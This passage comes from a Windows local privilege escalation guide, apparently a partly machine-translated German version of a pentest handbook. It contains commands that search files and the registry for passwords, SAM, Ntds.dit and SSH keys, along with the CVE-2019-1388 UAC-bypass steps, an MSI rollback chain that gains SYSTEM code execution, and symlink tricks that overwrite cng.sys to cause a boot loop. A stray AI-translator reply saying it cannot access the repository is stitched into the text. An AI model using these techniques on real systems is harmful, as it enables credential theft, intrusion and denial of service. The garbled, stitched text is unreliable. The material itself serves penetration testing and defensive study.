php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Ich habe keinen Zugriff auf dein Repository oder die Datei src/windows-hardening/windows-local-privilege-escalation/README.md. Bitte füge den Inhalt der Datei hier ein (oder gib die Liste der Dateien, die durchsucht/übersetzt werden sollen), dann übersetze ich den relevanten englischen Text ins Deutsche unter Beibehaltung sämtlicher Markdown-/HTML-Syntax.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials im RecycleBin

Du solltest auch den Bin überprüfen, um darin nach credentials zu suchen

Um **passwords** wiederherzustellen, die von mehreren Programmen gespeichert wurden, kannst du Folgendes verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### In der Registry

**Weitere mögliche Registry-Keys mit credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browser-Verlauf

Sie sollten nach dbs suchen, in denen Passwörter von **Chrome oder Firefox** gespeichert sind.\
Prüfen Sie auch den Verlauf, Lesezeichen und Favoriten der Browser, da dort möglicherweise einige **Passwörter** gespeichert sind.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ist eine im Windows-Betriebssystem integrierte Technologie, die die Interkommunikation zwischen Softwarekomponenten in unterschiedlichen Sprachen ermöglicht. Jede COM-Komponente wird über eine class ID (CLSID) identifiziert und jede Komponente stellt Funktionalität über eine oder mehrere Schnittstellen bereit, die über interface IDs (IIDs) identifiziert werden.

COM-Klassen und -Schnittstellen sind in der Registry unter **HKEY\CLASSES\ROOT\CLSID** bzw. **HKEY\CLASSES\ROOT\Interface** definiert. Diese Registry entsteht durch das Zusammenführen von **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Innerhalb der CLSIDs dieser Registry finden Sie den Unterschlüssel **InProcServer32**, der einen **default value** enthält, der auf eine **DLL** zeigt, und einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) oder **Neutral** (Thread Neutral) sein kann.

![](<../../images/image (729).png>)

Grundsätzlich gilt: Wenn Sie irgendeine der DLLs, die ausgeführt werden, überschreiben können, könnten Sie escalate privileges, falls diese DLL von einem anderen Benutzer ausgeführt wird.

Um zu lernen, wie Angreifer COM Hijacking als Persistenzmechanismus nutzen, siehe:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Suche nach einer Datei mit einem bestimmten Dateinamen**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Registry nach key names und passwords durchsuchen**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools, die nach Passwörtern suchen

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf** Plugin. Ich habe dieses Plugin erstellt, um **automatisch jedes metasploit POST module auszuführen, das nach Zugangsdaten** im Zielsystem sucht.\  
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) durchsucht automatisch alle Dateien, die Passwörter enthalten, die auf dieser Seite erwähnt werden.\  
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um Passwörter aus einem System zu extrahieren.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **Sitzungen**, **Benutzernamen** und **Passwörtern** mehrerer Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Stell dir vor, dass **ein Prozess, der als SYSTEM läuft, einen neuen Prozess öffnet** (`OpenProcess()`) mit **vollem Zugriff**. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Rechten, der jedoch alle offenen Handles des Hauptprozesses erbt**.\
Wenn du dann **vollen Zugriff auf den niedrig privilegierten Prozess** hast, kannst du das **offene Handle zum privilegierten Prozess, das mit `OpenProcess()` erstellt wurde, ergreifen** und **Shellcode injizieren**.\
[Lies dieses Beispiel für mehr Informationen darüber, **wie man diese Verwundbarkeit erkennt und ausnutzt**.](leaked-handle-exploitation.md)\
[Lies diesen **anderen Beitrag für eine ausführlichere Erklärung, wie man weitere offene Handles von Prozessen und Threads testet und missbraucht, die mit unterschiedlichen Berechtigungsstufen vererbt werden (nicht nur voller Zugriff)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Geteilte Speichersegmente, sogenannte **pipes**, ermöglichen Prozesskommunikation und Datenaustausch.

Windows bietet eine Funktion namens **Named Pipes**, die es nicht verwandten Prozessen erlaubt, Daten zu teilen, sogar über verschiedene Netzwerke. Das ähnelt einer Client/Server-Architektur, mit Rollen als **named pipe server** und **named pipe client**.

Wenn Daten von einem **Client** durch eine Pipe gesendet werden, kann der **Server**, der die Pipe eingerichtet hat, die **Identität** des **Clients** annehmen, falls er die nötigen **SeImpersonate**-Rechte besitzt. Das Auffinden eines **privilegierten Prozesses**, der über eine Pipe kommuniziert, die du nachahmen kannst, bietet die Möglichkeit, **höhere Rechte zu erlangen**, indem du die Identität dieses Prozesses übernimmst, sobald er mit der von dir eingerichteten Pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs findest du [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).

Außerdem ermöglicht das folgende Tool, eine named pipe-Kommunikation mit einem Tool wie burp abzufangen: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **und dieses Tool erlaubt es, alle Pipes aufzulisten und zu durchsuchen, um privescs zu finden** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Der Telephony-Dienst (TapiSrv) im Server-Modus exponiert `\\pipe\\tapsrv` (MS-TRP). Ein remote authentifizierter Client kann den auf Mailslot basierenden asynchronen Event-Pfad ausnutzen, um `ClientAttach` in einen beliebigen **4-byte write** auf jede existierende Datei zu verwandeln, die von `NETWORK SERVICE` beschreibbar ist, anschließend Telephony-Administratorrechte zu erlangen und eine beliebige DLL als Dienst zu laden. Vollständiger Ablauf:

- `ClientAttach` mit `pszDomainUser` gesetzt auf einen vorhandenen, beschreibbaren Pfad → der Dienst öffnet ihn via `CreateFileW(..., OPEN_EXISTING)` und verwendet ihn für asynchrone Event-Schreibvorgänge.
- Jedes Event schreibt das angreifer-kontrollierte `InitContext` aus `Initialize` auf diesen Handle. Registriere eine line app mit `LRegisterRequestRecipient` (`Req_Func 61`), löse `TRequestMakeCall` (`Req_Func 121`) aus, hole per `GetAsyncEvents` (`Req_Func 0`), dann deregistriere/fahre herunter, um deterministische Schreibvorgänge zu wiederholen.
- Füge dich selbst zu `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini` hinzu, verbinde dich neu und rufe dann `GetUIDllName` mit einem beliebigen DLL-Pfad auf, um `TSPI_providerUIIdentify` als `NETWORK SERVICE` auszuführen.

Mehr Details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Verschiedenes

### File Extensions that could execute stuff in Windows

Siehe die Seite **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Klickbare Markdown-Links, die an `ShellExecuteExW` weitergereicht werden, können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder beliebige registrierte Schemes) triggern und von Angreifer kontrollierte Dateien als der aktuelle Benutzer ausführen. Siehe:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Wenn du eine Shell als Benutzer erhältst, können geplante Tasks oder andere Prozesse ausgeführt werden, die **Anmeldeinformationen in der Befehlszeile übergeben**. Das untenstehende Script erfasst die Prozess-Befehlszeilen alle zwei Sekunden und vergleicht den aktuellen Zustand mit dem vorherigen, wobei es alle Unterschiede ausgibt.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Passwörter aus Prozessen stehlen

## Von Low-Priv-User zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn Sie Zugriff auf die grafische Oberfläche (über Konsole oder RDP) haben und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, ein Terminal oder einen anderen Prozess wie "NT\AUTHORITY SYSTEM" als unprivilegierter Benutzer auszuführen.

Das ermöglicht es, mit der gleichen Verwundbarkeit Privilegien zu eskalieren und gleichzeitig UAC zu umgehen. Außerdem ist es nicht nötig, etwas zu installieren, und die während des Prozesses verwendete Binärdatei ist von Microsoft signiert und ausgestellt.

Einige der betroffenen Systeme sind die folgenden:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Um diese Schwachstelle auszunutzen, ist es notwendig, die folgenden Schritte auszuführen:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Lies das hier, um **etwas über Integrity Levels zu lernen**:


{{#ref}}
integrity-levels.md
{{#endref}}

Lies dann **dieses, um etwas über UAC und UAC bypasses zu lernen:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Die in [**diesem Blogpost**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschriebene Technik mit einem Exploit-Code [**hier verfügbar**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Der Angriff besteht im Wesentlichen darin, das Rollback-Feature des Windows Installer auszunutzen, um legitime Dateien während des Deinstallationsprozesses durch bösartige zu ersetzen. Dazu muss der Angreifer einen **malicious MSI installer** erstellen, der verwendet wird, um den `C:\Config.Msi`-Ordner zu kapern, der später vom Windows Installer zum Speichern von Rollback-Dateien während der Deinstallation anderer MSI-Pakete verwendet wird, wobei die Rollback-Dateien so verändert wurden, dass sie die bösartige Nutzlast enthalten.

Die zusammengefasste Technik sieht wie folgt aus:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Erstelle ein `.msi`, das eine harmlose Datei (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`) installiert.
- Markiere den Installer als **"UAC Compliant"**, sodass ein **non-admin user** ihn ausführen kann.
- Halte nach der Installation einen **Handle** auf die Datei offen.

- Step 2: Begin Uninstall
- Deinstalliere dasselbe `.msi`.
- Der Deinstallationsprozess beginnt Dateien nach `C:\Config.Msi` zu verschieben und sie in `.rbf`-Dateien (Rollback-Backups) umzubenennen.
- **Poll** den offenen File-Handle mit `GetFinalPathNameByHandle`, um zu erkennen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Step 3: Custom Syncing
- Das `.msi` enthält eine **custom uninstall action (`SyncOnRbfWritten`)**, die:
- signalisiert, wenn `.rbf` geschrieben wurde.
- und dann auf ein anderes Event **wartet**, bevor die Deinstallation fortgesetzt wird.

- Step 4: Block Deletion of `.rbf`
- Wenn signalisiert, **öffne die `.rbf`-Datei** ohne `FILE_SHARE_DELETE` — das **verhindert, dass sie gelöscht wird**.
- Dann **signal zurück**, sodass die Deinstallation abgeschlossen werden kann.
- Der Windows Installer scheitert daran, die `.rbf` zu löschen, und weil er nicht alle Inhalte löschen kann, wird **`C:\Config.Msi` nicht entfernt**.

- Step 5: Manually Delete `.rbf`
- Du (Angreifer) löscht die `.rbf`-Datei manuell.
- Jetzt ist **`C:\Config.Msi` leer** und bereit zur Übernahme.

> An diesem Punkt **triggerst du die SYSTEM-level arbitrary folder delete vulnerability**, um `C:\Config.Msi` zu löschen.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Erstelle den `C:\Config.Msi`-Ordner selbst neu.
- Setze **schwache DACLs** (z. B. Everyone:F), und **halte einen Handle offen** mit `WRITE_DAC`.

- Step 7: Run Another Install
- Installiere das `.msi` erneut, mit:
- `TARGETDIR`: beschreibbarer Ort.
- `ERROROUT`: Eine Variable, die einen erzwungenen Fehler auslöst.
- Diese Installation wird verwendet, um erneut ein **rollback** auszulösen, das `.rbs` und `.rbf` liest.

- Step 8: Monitor for `.rbs`
- Verwende `ReadDirectoryChangesW`, um `C:\Config.Msi` zu überwachen, bis eine neue `.rbs` erscheint.
- Erfasse deren Dateinamen.

- Step 9: Sync Before Rollback
- Das `.msi` enthält eine **custom install action (`SyncBeforeRollback`)**, die:
- ein Event signalisiert, wenn die `.rbs` erstellt wird.
- und dann **wartet**, bevor sie fortfährt.

- Step 10: Reapply Weak ACL
- Nachdem das ` .rbs created`-Event empfangen wurde:
- wendet der Windows Installer **starke ACLs** auf `C:\Config.Msi` an.
- Aber da du noch einen Handle mit `WRITE_DAC` offen hast, kannst du die **schwachen ACLs wiederherstellen**.

> ACLs werden **nur beim Öffnen des Handles durchgesetzt**, also kannst du weiterhin in den Ordner schreiben.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Überschreibe die `.rbs`-Datei mit einem **gefälschten Rollback-Skript**, das Windows anweist:
- dein `.rbf` (bösartige DLL) in einen **privilegierten Ort** wiederherzustellen (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Lege deine gefälschte `.rbf` ab, die eine **bösartige SYSTEM-level payload DLL** enthält.

- Step 12: Trigger the Rollback
- Signalisiere das Sync-Event, damit der Installer fortfährt.
- Eine **type 19 custom action (`ErrorOut`)** ist so konfiguriert, dass die Installation an einem bekannten Punkt absichtlich fehlschlägt.
- Das verursacht, dass **Rollback beginnt**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- liest deine bösartige `.rbs`.
- kopiert deine `.rbf`-DLL in das Zielverzeichnis.
- Du hast nun deine **bösartige DLL in einem von SYSTEM geladenen Pfad**.

- Final Step: Execute SYSTEM Code
- Führe ein vertrauenswürdiges **auto-elevated binary** aus (z. B. `osk.exe`), das die von dir gehijackte DLL lädt.
- **Boom**: Dein Code wird **als SYSTEM** ausgeführt.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Die Haupt-MSI-Rollback-Technik (die vorherige) geht davon aus, dass du einen **gesamten Ordner** löschen kannst (z. B. `C:\Config.Msi`). Aber was, wenn deine Vulnerability nur **arbitrary file deletion** erlaubt?

Du könntest NTFS-Interna ausnutzen: Jeder Ordner hat einen verborgenen alternativen Datenstrom, genannt:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Dieser Stream speichert die **Index-Metadaten** des Ordners.

Wenn du also den **`::$INDEX_ALLOCATION`-Stream** eines Ordners **löschst**, entfernt NTFS **den gesamten Ordner** aus dem Dateisystem.

Das kannst du mit standardmäßigen Datei-Lösch-APIs wie:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Auch wenn du eine *file* delete API aufrufst, **löscht sie den Ordner selbst**.

### Von 'Folder Contents Delete' zu SYSTEM EoP
Was, wenn deine primitive es dir nicht erlaubt, beliebige Dateien/Ordner zu löschen, dafür aber **das Löschen der *contents* eines attacker-controlled folder erlaubt**?

1. Schritt 1: Einen Köder-Ordner und -Datei einrichten
- Erstellen: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Platziere ein **oplock** auf `file1.txt`
- Das **oplock** **pausiert die Ausführung**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess durchsucht Ordner (z. B. `%TEMP%`) und versucht, deren Inhalte zu löschen.
- Wenn er `file1.txt` erreicht, wird der **oplock** ausgelöst und übergibt die Kontrolle an deinen Callback.

4. Schritt 4: Innerhalb des oplock callback – leite die Löschung um

- Option A: Verschiebe `file1.txt` an einen anderen Ort
- Dadurch wird `folder1` geleert, ohne den oplock zu brechen.
- Lösche `file1.txt` nicht direkt — das würde den oplock vorzeitig freigeben.

- Option B: Wandle `folder1` in eine **junction** um:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: Erstelle einen **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dies zielt auf den NTFS-internen Stream, der Ordner-Metadaten speichert — dessen Löschung löscht den Ordner.

5. Schritt 5: oplock freigeben
- SYSTEM-Prozess fährt fort und versucht `file1.txt` zu löschen.
- Aber jetzt, aufgrund der junction + symlink, löscht es tatsächlich:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### From Arbitrary Folder Create to Permanent DoS

Nutze einen Mechanismus, der es dir erlaubt, **create an arbitrary folder as SYSTEM/admin** — selbst wenn **du keine Dateien schreiben kannst** oder **keine schwachen Berechtigungen setzen kannst**.

Erstelle einen **Ordner** (keine Datei) mit dem Namen eines **kritischen Windows-Treibers**, z. B.:
```
C:\Windows\System32\cng.sys
```
- Dieser Pfad entspricht normalerweise dem Kernel-Modus-Treiber `cng.sys`.
- Wenn du ihn **vorab als Ordner erstellst**, lädt Windows den eigentlichen Treiber beim Booten nicht.
- Windows versucht dann, `cng.sys` während des Bootvorgangs zu laden.
- Es sieht den Ordner, **kann den eigentlichen Treiber nicht auflösen**, und **stürzt ab oder hält den Bootvorgang an**.
- Es gibt **keinen Fallback** und **keine Wiederherstellung** ohne externe Intervention (z. B. Boot-Reparatur oder Festplattenzugriff).

### Von privilegierten Log-/Backup-Pfaden + OM symlinks zu arbitrary file overwrite / boot DoS

Wenn ein **privilegierter Dienst** Logs/Exports in einen aus einer **beschreibbaren Konfiguration** gelesenen Pfad schreibt, leite diesen Pfad mit **Object Manager symlinks + NTFS mount points** um, um den privilegierten Schreibvorgang in ein arbitrary overwrite zu verwandeln (selbst **ohne** SeCreateSymbolicLinkPrivilege).

**Voraussetzungen**
- Die Config, die den Zielpfad speichert, ist für den Angreifer beschreibbar (z. B. `%ProgramData%\...\.ini`).
- Möglichkeit, einen Mount Point zu `\RPC Control` und einen OM-Datei-Symbollink zu erstellen (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Eine privilegierte Operation, die in diesen Pfad schreibt (log, export, report).

**Beispielkette**
1. Lese die Konfiguration, um das privilegierte Log-Ziel zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Leite den Pfad ohne Admin um:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warten Sie, bis die privilegierte Komponente das Log schreibt (z. B. Admin löst "send test SMS" aus). Der Schreibvorgang landet nun in `C:\Windows\System32\cng.sys`.
4. Untersuchen Sie das überschriebene Ziel (hex/PE parser), um die Beschädigung zu bestätigen; ein Reboot zwingt Windows, den manipulierten Treiberpfad zu laden → **boot loop DoS**. Dies verallgemeinert sich auch auf jede geschützte Datei, die ein privilegierter Dienst zum Schreiben öffnet.

> `cng.sys` wird normalerweise aus `C:\Windows\System32\drivers\cng.sys` geladen, aber wenn eine Kopie unter `C:\Windows\System32\cng.sys` existiert, kann versucht werden, diese zuerst zu laden, wodurch sie zu einer zuverlässigen DoS-Senke für korrupte Daten wird.



## **Von High Integrity zu System**

### **Neuer Dienst**

Wenn Sie bereits in einem High Integrity-Prozess laufen, kann der **Weg zu SYSTEM** sehr einfach sein, indem Sie einfach einen neuen Dienst **erstellen und ausführen**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wenn du eine Service-Binärdatei erstellst, stelle sicher, dass es ein gültiger Service ist oder dass die Binärdatei die notwendigen Aktionen schnell ausführt, da sie sonst nach 20s beendet wird, wenn es kein gültiger Service ist.

### AlwaysInstallElevated

Von einem High Integrity-Prozess aus kannst du versuchen, die AlwaysInstallElevated-Registry-Einträge zu **aktivieren** und eine reverse shell mit einem _**.msi**_ Wrapper zu **installieren**.\
[Weitere Informationen zu den beteiligten Registry-Keys und wie man ein _.msi_-Paket installiert findest du hier.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Du kannst** [**den Code hier finden**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Wenn du diese Token-Privilegien hast (wahrscheinlich findest du diese bereits in einem High Integrity-Prozess), kannst du mit dem SeDebug-Privileg **fast jeden Prozess öffnen** (nicht geschützte Prozesse), das **Token des Prozesses kopieren** und einen **beliebigen Prozess mit diesem Token erstellen**.\
Bei dieser Technik wählt man in der Regel einen Prozess, der als SYSTEM läuft und alle Token-Privilegien besitzt (_ja, es gibt SYSTEM-Prozesse ohne alle Token-Privilegien_).\
**Du kannst ein** [**Beispielcode, der die vorgeschlagene Technik ausführt, hier finden**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Diese Technik wird von meterpreter in `getsystem` verwendet. Die Technik besteht darin, **eine Pipe zu erstellen und dann einen Service zu erstellen/missbrauchen, um in diese Pipe zu schreiben**. Danach wird der **Server**, der die Pipe mit dem **`SeImpersonate`**-Privileg erstellt hat, in der Lage sein, das **Token des Pipe-Clients** (des Service) zu **impersonate** und SYSTEM-Privilegien zu erlangen.\
Wenn du [**mehr über named pipes lernen willst, solltest du das hier lesen**](#named-pipe-client-impersonation).\
Wenn du ein Beispiel lesen willst, [**wie man von High Integrity zu System mit named pipes gelangt, solltest du das hier lesen**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es dir gelingt, eine dll zu **hijacken**, die von einem **Prozess** ausgeführt als **SYSTEM** geladen wird, kannst du beliebigen Code mit diesen Rechten ausführen. Daher ist Dll Hijacking auch für diese Art der Privilegieneskalation nützlich und darüber hinaus **viel einfacher von einem High Integrity-Prozess aus zu erreichen**, da dieser **Schreibrechte** auf die Ordner hat, die zum Laden von DLLs verwendet werden.\
**Du kannst** [**hier mehr über Dll hijacking lernen**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Siehe:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Mehr Hilfe

[Statische impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Nützliche Tools

**Bestes Tool, um Windows lokale Privilegien-Eskalations-Vektoren zu finden:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Überprüft auf Fehlkonfigurationen und sensible Dateien (**[**siehe hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Erkannt.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Überprüft einige mögliche Fehlkonfigurationen und sammelt Informationen (**[**siehe hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Überprüft auf Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrahiert gespeicherte Sitzungsinformationen von PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP. Lokal - nutze -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Credentials aus dem Credential Manager. Erkannt.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Sprayt gesammelte Passwörter über die Domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell ADIDNS/LLMNR/mDNS-Spoofer und Man-in-the-Middle-Tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Grundlegende Privesc Windows-Enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Sucht nach bekannten Privesc-Schwachstellen (VERALTET zugunsten von Watson)\
